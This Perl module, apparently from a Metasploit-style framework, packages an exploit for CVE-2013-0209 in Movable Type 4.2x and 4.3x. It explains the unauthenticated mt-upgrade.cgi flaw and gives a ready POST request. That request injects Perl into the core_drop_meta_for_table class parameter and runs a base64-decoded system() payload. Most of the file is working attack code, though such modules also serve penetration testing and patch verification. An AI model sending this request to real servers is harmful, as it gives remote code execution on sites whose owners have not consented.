package MOVABLETYPE::MSF::MovabletypeUpgradeExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "MovabletypeUpgradeExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2013-0209",
  DESCRIPTION => "

          This module can be used to execute a payload on MoveableType (MT) that

          exposes a CGI script, mt-upgrade.cgi (usually at /mt/mt-upgrade.cgi),

          that is used during installation and updating of the platform.

          The vulnerability arises due to the following properties:

          1. This script may be invoked remotely without requiring authentication

          to any MT instance.

          2. Through a crafted POST request, it is possible to invoke particular

          database migration functions (i.e. functions that bring the existing

          database up-to-date with an updated codebase) by name and with

          particular parameters.

          3. A particular migration function, core_drop_meta_for_table, allows

          a class parameter to be set which is used directly in a perl eval

          statement, allowing perl code injection.

      ",
  MSF_MODULE => "movabletype_upgrade_exec",
  OSVDB => 89322,
  PATHS => ["mt"],
  REFERENCES => [
    "http://www.sec-1.com/blog/?p=402",
    "http://www.movabletype.org/2013/01/movable_type_438_patch.html",
  ],
  TITLE => "Movable Type 4.2x, 4.3x Web Upgrade Remote Code Execution",
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "The URI path of the Movable Type installation",
  VALUE => "/mt",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => 'mt-upgrade.cgi',
      PAYLOAD      => '__mode=run_actions&installing=1&steps=%5b%5b%22core_drop_meta_for_table%22%2c%22class%22%2c%22v0%3buse%20MIME%3a%3aBase64%3bsystem%28decode_base64%28q%28X19QQVlMT0FEX18%3d%29%29%29%3breturn%200%22%5d%5d',
      TEXT   => 'Sending Exploit #2 Request : [POST] /mt-upgrade.cgi',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
